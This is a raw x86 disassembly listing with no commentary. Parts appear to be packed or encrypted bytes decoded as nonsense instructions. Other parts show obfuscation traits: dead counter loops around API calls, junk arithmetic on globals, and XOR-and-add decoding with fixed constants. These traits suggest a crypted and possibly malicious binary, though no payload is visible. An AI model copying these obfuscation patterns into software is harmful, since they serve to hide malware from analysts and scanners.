  408a3f:	inc    ecx
  408a40:	inc    esp
  408a41:	push   edi
  408a42:	fstp   TBYTE PTR [esi]
  408a44:	test   DWORD PTR [ebx+0x674c3220],esp
  408a4a:	pushf  
  408a4b:	and    al,0x78
  408a4d:	in     al,0x47
  408a4f:	push   cs
  408a50:	ror    DWORD PTR [eax+eax*4+0x0],1
  408a54:	jge    0x408a55
  408a56:	leave  
  408a57:	test   DWORD PTR [ebx+eax*8],ebx
  408a5a:	sbb    ch,0xb
  408a5d:	xor    esp,DWORD PTR [ecx]
  408a5f:	fcmovnb st,st(6)
  408a61:	inc    ebp
  408a62:	mov    edi,0xe41bd801
  408a67:	mov    edx,0x829029f4
  408a6c:	ins    DWORD PTR es:[edi],dx
  408a6d:	mov    ah,0xfa
  408a6f:	sub    eax,0x272acd41
  408a74:	xor    eax,0x813c534f
  408a79:	leave  
  408a7a:	(bad)  
  408a7b:	sbb    eax,0xc18b8116
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e86a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e86a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e86a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430596
  408ab1:	push   0x42ef30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42ebac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e86a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e86a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e866,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4305c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	popf   
  408b13:	arpl   WORD PTR [ecx],cx
  408b15:	outs   dx,DWORD PTR ds:[esi]
  408b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408ac2
  408b1f:	lock inc ebp
  408b21:	sbb    al,0x3
  408b23:	push   eax
  408b24:	(bad)  
  408b25:	in     eax,0x33
  408b27:	dec    ebx
  408b28:	or     DWORD PTR [ebx+0x756c917a],eax
  408b2e:	xchg   edi,eax
  408b2f:	into   
  408b30:	out    0xa1,al
  408b32:	inc    ebx
  408b33:	fld    QWORD PTR [ebp+0x6a007c21]
  408b39:	int    0x98
  408b3b:	xchg   edx,eax
  408b3c:	xchg   edx,eax
  408b3d:	mov    eax,ds:0x981b2604
  408b42:	pop    ecx
  408b43:	int    0x41
  408b45:	xchg   ebx,eax
  408b46:	ja     0x408b40
  408b48:	mov    DWORD PTR [edi],edx
  408b4a:	into   
  408b4b:	imul   esp,DWORD PTR [edx-0x18],0x76a81eff
  408b52:	cmp    ebx,DWORD PTR [ecx-0x371164be]
  408b58:	fs addr16 (bad) 
  408b5b:	adc    dl,BYTE PTR [ebx-0x3d1ae019]
  408b61:	pop    esp
  408b62:	mov    ds:0xac572319,al
  408b67:	and    eax,0xeb847305
  408b6c:	cmc    
  408b6d:	jno    0x408af5
  408b6f:	xor    esp,eax
  408b71:	and    al,0xd0
  408b73:	jg     0x408b78
  408b75:	das    
  408b76:	push   ecx
  408b77:	mov    bl,0xf9
  408b79:	cmp    esp,ebp
  408b7b:	sbb    bl,ah
  408b7d:	lock scas eax,DWORD PTR es:[edi]
  408b7f:	daa    
  408b80:	or     ah,cl
  408b82:	mov    edi,DWORD PTR [eax]
  408b84:	xchg   esp,eax
  408b85:	add    BYTE PTR [ecx+0x269f8e3f],bh
  408b8b:	scas   al,BYTE PTR es:[edi]
  408b8c:	out    0x77,eax
  408b8e:	je     0x408c04
  408b90:	mov    dl,0xb8
  408b92:	mov    bh,0x75
  408b94:	pop    es
  408b95:	fld    st(2)
  408b97:	push   edx
  408b98:	les    esp,FWORD PTR [edi+0x422c115c]
  408b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b9f:	mov    bl,0xe3
  408ba1:	adc    ebp,esp
  408ba3:	add    edi,esp
  408ba5:	test   BYTE PTR [ebx+0x27],cl
  408ba8:	fs gs dec ecx
  408bab:	pop    ebp
  408bac:	out    dx,eax
  408bad:	xor    DWORD PTR [ebx],edi
  408baf:	xchg   DWORD PTR [edi+eax*2-0x4bd90f4e],esi
  408bb6:	dec    edx
  408bb7:	mov    eax,ds:0x34857663
  408bbc:	push   ss
  408bbd:	mov    dh,0x9c
  408bbf:	push   edx
  408bc0:	xchg   edi,eax
  408bc1:	int    0x70
  408bc3:	push   ebp
  408bc4:	fcomi  st,st(4)
  408bc6:	imul   BYTE PTR [edx]
  408bc8:	cmp    eax,0x8d38c152
  408bcd:	sub    ah,BYTE PTR [eax]
  408bcf:	pop    ebx
  408bd0:	push   ecx
  408bd1:	mov    edi,0x950e8b60
  408bd6:	retf   0x77ba
  408bd9:	sbb    DWORD PTR [ebp+0xe],0xdad1c4f1
  408be0:	test   BYTE PTR [ecx-0x67891665],bh
  408be6:	rol    bl,cl
  408be8:	pop    eax
  408be9:	or     al,0x7f
  408beb:	cmp    eax,DWORD PTR [eax+0x16165a6c]
  408bf1:	arpl   dx,bp
  408bf3:	sbb    DWORD PTR [eax+0x55],esi
  408bf6:	ins    DWORD PTR es:[edi],dx
  408bf7:	sub    DWORD PTR [ecx-0x5e0c5d12],ebp
  408bfd:	aam    0xe3
  408bff:	in     eax,0xd5
  408c01:	mul    DWORD PTR [edx]
  408c03:	pop    ebx
  408c04:	cmp    eax,DWORD PTR [edx+0xe]
  408c07:	cli    
  408c08:	jnp    0x408bed
  408c0a:	mov    al,0x3b
  408c0c:	fdivrp st(2),st
  408c0e:	cmp    eax,0xa87c6be9
  408c13:	xchg   ebp,eax
  408c14:	fdivr  st,st(0)
  408c16:	mov    BYTE PTR [edx+0x71],dl
  408c19:	imul   esp,esi,0xffffffa9
  408c1c:	jb     0x408c56
  408c1e:	adc    DWORD PTR [edx-0x26946951],ecx
  408c24:	dec    esi
  408c26:	mov    WORD PTR [ecx+0x1873c327],?
  408c2c:	inc    esi
  408c2d:	dec    esi
  408c2e:	push   0x67
  408c30:	div    DWORD PTR [eax+0x77d16257]
  408c36:	or     al,0x22
  408c38:	jno    0x408c51
  408c3a:	adc    eax,0xb1b96fb7
  408c3f:	mov    esi,0x9526c5bb
  408c44:	call   0x1b1a:0xb400421f
  408c4b:	sbb    eax,0x2af6c0e3
  408c50:	cmp    al,0x67
  408c52:	ins    BYTE PTR es:[edi],dx
  408c53:	sub    al,BYTE PTR [ecx+0x5e841b63]
  408c59:	cmp    al,0x94
  408c5b:	inc    ecx
  408c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c5d:	add    eax,0x324f4d75
  408c62:	xor    esi,edi
  408c64:	pop    edi
  408c65:	cmp    dl,BYTE PTR [ebp+0x5b]
  408c68:	in     eax,0x9
  408c6a:	clc    
  408c6b:	ret    0x10c1
  408c6e:	xlat   BYTE PTR ds:[ebx]
  408c6f:	xchg   edx,eax
  408c70:	pushf  
  408c71:	and    DWORD PTR [edi+ecx*4-0x3b],edi
  408c75:	adc    BYTE PTR [ecx],bh
  408c77:	inc    edx
  408c78:	push   cs
  408c79:	popa   
  408c7a:	mov    bl,dh
  408c7c:	fst    QWORD PTR [eax-0x3f]
  408c7f:	out    dx,eax
  408c80:	nop
  408c81:	mov    edi,0xd39d004c
  408c86:	dec    ebx
  408c87:	test   al,0xee
  408c89:	js     0x408c51
  408c8b:	out    dx,al
  408c8c:	lds    esp,FWORD PTR [edi]
  408c8e:	mov    ecx,0x1404e399
  408c93:	(bad)  
  408c94:	sbb    esi,DWORD PTR [ebx]
  408c96:	push   eax
  408c97:	sti    
  408c98:	sbb    bh,BYTE PTR [esi-0x20ab9615]
  408c9e:	push   ecx
  408c9f:	imul   ebp,DWORD PTR [esi+0x32],0x7c
  408ca3:	mov    eax,ds:0xc1c6e832
  408ca8:	inc    ecx
  408ca9:	push   ebx
  408caa:	addr16 addr16 push edi
  408cad:	sub    al,bh
  408caf:	inc    esp
  408cb0:	loopne 0x408cfe
  408cb2:	test   bh,0xcd
  408cb5:	sbb    DWORD PTR [esi],0x99c58e9d
  408cbb:	xor    bl,BYTE PTR [ebx-0xe412018]
  408cc1:	mov    WORD PTR [edi],?
  408cc3:	repz scas eax,DWORD PTR es:[edi]
  408cc5:	fadd   DWORD PTR [ebx+0x2accb306]
  408ccb:	and    DWORD PTR [esi+0x7d],edx
  408cce:	jg     0x408d0d
  408cd0:	jge    0x408cb0
  408cd2:	js     0x408c7f
  408cd4:	sti    
  408cd5:	cmp    esp,esp
  408cd7:	jecxz  0x408c9e
  408cd9:	ja     0x408d02
  408cdb:	test   BYTE PTR [edx-0x4c37a354],al
  408ce1:	lods   eax,DWORD PTR ds:[esi]
  408ce2:	in     al,dx
  408ce3:	scas   al,BYTE PTR es:[edi]
  408ce4:	xor    eax,eax
  408ce6:	shl    BYTE PTR [esp+ebp*4-0x2e],cl
  408cea:	xchg   edx,eax
  408ceb:	ror    DWORD PTR [edi-0x36dee8e8],1
  408cf1:	push   edx
  408cf2:	jp     0x408cf1
  408cf4:	repz add eax,0x32729d
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x430676
  408d02:	mov    eax,ds:0x430692
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	iret   
  408d55:	jb     0x408da2
  408d57:	lea    ecx,[esp+edx*8+0x7f457e7e]
  408d5e:	jle    0x408dde
  408d60:	pop    ds
  408d61:	lods   eax,DWORD PTR ds:[esi]
  408d62:	cwde   
  408d63:	sub    ch,BYTE PTR [eax+0x78e55d33]
  408d69:	pop    ds
  408d6a:	or     DWORD PTR [edx+ebp*4-0x5586b30d],0xed985926
  408d75:	test   eax,0x17e50b06
  408d7a:	pop    edi
  408d7b:	cwde   
  408d7c:	sar    BYTE PTR [eax],cl
  408d7e:	scas   eax,DWORD PTR es:[edi]
  408d7f:	test   DWORD PTR [ecx+0x75],eax
  408d82:	(bad)  
  408d83:	mov    gs,eax
  408d85:	jno    0x408d76
  408d87:	cld    
  408d88:	push   ebp
  408d89:	xchg   edx,eax
  408d8a:	pop    es
  408d8b:	sbb    al,0x8c
  408d8d:	jb     0x408dee
  408d8f:	pop    ecx
  408d90:	out    dx,eax
  408d91:	scas   al,BYTE PTR es:[edi]
  408d92:	mov    edx,0x57bcebf0
  408d97:	ret    
  408d98:	iret   
  408d99:	sbb    DWORD PTR [ebp+0xd],ebx
  408d9c:	(bad)  [eax+edx*2-0x107f9fe3]
  408da3:	das    
  408da4:	push   edx
  408da5:	aad    0xee
  408da7:	push   esi
  408da8:	test   DWORD PTR [ecx+0x4a41f13e],esi
  408dae:	and    esi,edx
  408db0:	daa    
  408db1:	adc    al,BYTE PTR [eax]
  408db3:	xor    DWORD PTR [eax],ebx
  408db5:	or     BYTE PTR [ebp+edx*8+0x404f90d],dh
  408dbc:	loop   0x408d7b
  408dbe:	jge    0x408e1c
  408dc0:	(bad)  
  408dc1:	mov    bl,0xe9
  408dc3:	sbb    BYTE PTR [esi+eax*4+0x1e],0x38
  408dc8:	pop    edi
  408dc9:	and    DWORD PTR [ecx-0x7929c5c],0x5887d68d
  408dd3:	and    ebx,0x94e4bad0
  408dd9:	rcr    DWORD PTR [ebp-0x1a],cl
  408ddc:	dec    sp
  408dde:	dec    DWORD PTR [ecx-0x6a6ae769]
  408de4:	cwde   
  408de5:	fld    TBYTE PTR [ebx+0x797444b1]
  408deb:	lds    eax,FWORD PTR [ebx-0x20]
  408dee:	mov    dl,0x28
  408df0:	dec    edx
  408df1:	lods   eax,DWORD PTR ds:[esi]
  408df2:	mov    bh,0x12
  408df4:	aaa    
  408df5:	in     al,0x1e
  408df7:	mov    edx,0xb389686c
  408dfc:	scas   eax,DWORD PTR es:[edi]
  408dfd:	add    eax,0x4dc2af21
  408e02:	cs jb  0x408dca
  408e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e06:	repnz in eax,dx
  408e08:	mov    eax,0xffe9d90a
  408e0d:	dec    edi
  408e0e:	inc    edx
  408e0f:	cdq    
  408e10:	pushf  
  408e11:	mov    eax,ds:0x104a0efc
  408e16:	in     eax,0x66
  408e18:	in     al,dx
  408e19:	jb     0x408def
  408e1b:	cwde   
  408e1c:	dec    ebx
  408e1d:	std    
  408e1e:	dec    ebp
  408e1f:	(bad)  
  408e20:	xchg   ebx,eax
  408e21:	adc    ah,bl
  408e23:	test   DWORD PTR [edi-0x38],0x68b62fd3
  408e2a:	pop    ebp
  408e2b:	sahf   
  408e2c:	imul   edx,DWORD PTR [edi-0x4e76cf50],0x6f31dd6c
  408e36:	push   esi
  408e37:	aas    
  408e38:	adc    BYTE PTR [ecx+esi*1+0x4e6e1f0],bh
  408e3f:	jno    0x408e64
  408e41:	aaa    
  408e42:	xor    ebx,DWORD PTR [esi]
  408e44:	cmp    esi,DWORD PTR [ebx]
  408e46:	rcl    bh,cl
  408e48:	lods   eax,DWORD PTR ds:[esi]
  408e49:	shl    DWORD PTR es:[edi+0x2aff4e06],1
  408e50:	adc    BYTE PTR [ecx-0x450d2f5f],0x59
  408e57:	mov    ebp,0xf48548b3
  408e5c:	cmp    ebx,ecx
  408e5e:	xchg   ebx,eax
  408e5f:	push   ss
  408e60:	push   ds
  408e61:	cmp    al,0x6e
  408e63:	mov    esi,0x426f33a6
  408e68:	out    0x89,eax
  408e6a:	mov    dl,0x25
  408e6c:	les    edx,FWORD PTR [eax-0x72262679]
  408e72:	sbb    al,0xf5
  408e74:	adc    al,0xc
  408e76:	mov    eax,0x6fe7eaf3
  408e7b:	lock mov bh,0x59
  408e7e:	xor    BYTE PTR [edi-0x48ab7c11],dh
  408e84:	mov    al,0x68
  408e86:	push   ebx
  408e87:	sahf   
  408e88:	adc    eax,0x7040245e
  408e8d:	pop    edi
  408e8e:	or     BYTE PTR [eax+0xf4959d8],dh
  408e94:	mov    esi,0x4bba8077
  408e99:	mov    bh,0x8b
  408e9b:	scas   al,BYTE PTR es:[edi]
  408e9c:	(bad)  
  408e9e:	arpl   WORD PTR [edx-0x250d132b],cx
  408ea4:	lds    ecx,FWORD PTR [eax]
  408ea6:	aas    
  408ea7:	fwait
  408ea8:	push   esi
  408ea9:	in     al,0xac
  408eab:	or     DWORD PTR [ecx-0x4c],ebx
  408eae:	popf   
  408eaf:	lea    eax,[edx-0x53]
  408eb2:	loopne 0x408ea0
  408eb4:	out    0xc0,al
  408eb6:	cs inc eax
  408eb8:	add    eax,0xf6bd20a2
  408ebd:	sub    al,0x2b
  408ebf:	push   edi
  408ec0:	out    dx,al
  408ec1:	or     ecx,edi
  408ec3:	lods   al,BYTE PTR ds:[esi]
  408ec4:	addr16 loope 0x408e84
  408ec7:	mov    ds:0xa43d7ed7,eax
  408ecc:	imul   edx,DWORD PTR [esi+0x31],0xffffff94
  408ed0:	inc    ecx
  408ed1:	shl    ch,1
  408ed3:	dec    DWORD PTR [ecx+eiz*1-0x57f4908d]
  408eda:	stos   DWORD PTR es:[edi],eax
  408edb:	mov    al,fs:0x4fad7958
  408ee1:	popa   
  408ee2:	(bad)  
  408ee3:	mov    al,ds:0xbef49258
  408ee8:	or     esi,DWORD PTR [ebp-0x20c58bac]
  408eee:	call   0x388c5f8f
  408ef3:	or     edi,DWORD PTR [edi+0x6f]
  408ef6:	fsub   QWORD PTR [ebx+0x2e14ee0a]
  408efc:	(bad)  [esp+eiz*4-0x73e7a171]
  408f03:	push   ebx
  408f04:	or     DWORD PTR [ebx+0x40],esp
  408f07:	jno    0x408f65
  408f09:	cli    
  408f0a:	add    eax,0x44f17515
  408f0f:	push   0x4c
  408f11:	rep lods al,BYTE PTR ds:[esi]
  408f13:	mov    bh,0x5e
  408f15:	inc    ecx
  408f16:	mov    dh,0x36
  408f18:	popa   
  408f19:	sub    al,0x4c
  408f1b:	aam    0x6a
  408f1d:	fincstp 
  408f1f:	add    esi,DWORD PTR [ebp+0xc]
  408f22:	sbb    ecx,edx
  408f24:	arpl   WORD PTR [esi-0x7a826fd9],ax
  408f2a:	std    
  408f2b:	pop    edx
  408f2c:	push   edi
  408f2d:	mov    cs,ebp
  408f2f:	mov    eax,ds:0x9fe40bba
  408f34:	out    0xb6,eax
  408f36:	shl    DWORD PTR [ebx],0xc1
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ef08,0x42e86a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430646,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ef28,0x42e866
  408f71:	call   DWORD PTR ds:0x42eb4c
  408f77:	sbb    DWORD PTR ds:0x42e862,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4305ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4305b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42ec04
  408faf:	sbb    DWORD PTR ds:0x430652,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e85a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4305c2,0x42ef08
  408fe0:	call   DWORD PTR ds:0x42ec80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ef24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ec44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43065a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ef14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e862,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42eb3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4305aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ef24,0x43059a
  409056:	call   DWORD PTR ds:0x42ebdc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e862,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e862
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e862,ebx
  40907e:	cmp    DWORD PTR ds:0x42e862,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ecac
  409097:	cmp    DWORD PTR ds:0x42e862,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ef14
  4090aa:	and    DWORD PTR ds:0x42ef20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43058e
  4090bc:	sbb    edx,DWORD PTR ds:0x43064e
  4090c2:	mov    DWORD PTR ds:0x43058e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43059e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43059e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43059e,edx
  4090e2:	cmp    DWORD PTR ds:0x43059e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e87a
  4090f9:	push   0x42e9ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ecb0
  409109:	cmp    DWORD PTR ds:0x43059e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e866,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e866
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e866,edx
  40912d:	cmp    DWORD PTR ds:0x42e866,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42ebb0
  40914a:	cmp    DWORD PTR ds:0x42e866,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43059a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43058a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43058a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43058a,esi
  40917b:	cmp    DWORD PTR ds:0x43058a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e97b
  40918d:	push   0x42e87a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42ebc8
  40919d:	cmp    DWORD PTR ds:0x43058a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43058a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43058a,esi
  4091b7:	cmp    DWORD PTR ds:0x43058a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ef1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43064e,0x4305a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43064e
  4091fe:	adc    DWORD PTR ds:0x42ef18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43058e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43058e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43058e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43059e,0x4305ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4305ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4305e2
  409277:	mov    eax,ds:0x42ea9c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e86e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4305aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4305ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4305b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430656,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ef20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ef20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ef20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42ebcc
  409310:	mov    edi,DWORD PTR ds:0x42ef20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ef20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ef14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e876,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e872
  40934d:	adc    edx,DWORD PTR ds:0x4305c2
  409353:	mov    DWORD PTR ds:0x42e872,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ef2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ef2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ef2c,edi
  409376:	cmp    DWORD PTR ds:0x42ef2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e866
  40938b:	call   DWORD PTR ds:0x42ecb4
  409391:	cmp    DWORD PTR ds:0x42ef2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ef2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ef2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ef2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4305b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ef28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ef28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ef28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ef28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ef28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ebd0
  409402:	cmp    DWORD PTR ds:0x42ef28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ef28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ef28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ef0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ef0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ef0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42ebb4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ef0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ef0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43065a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43058a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43059e
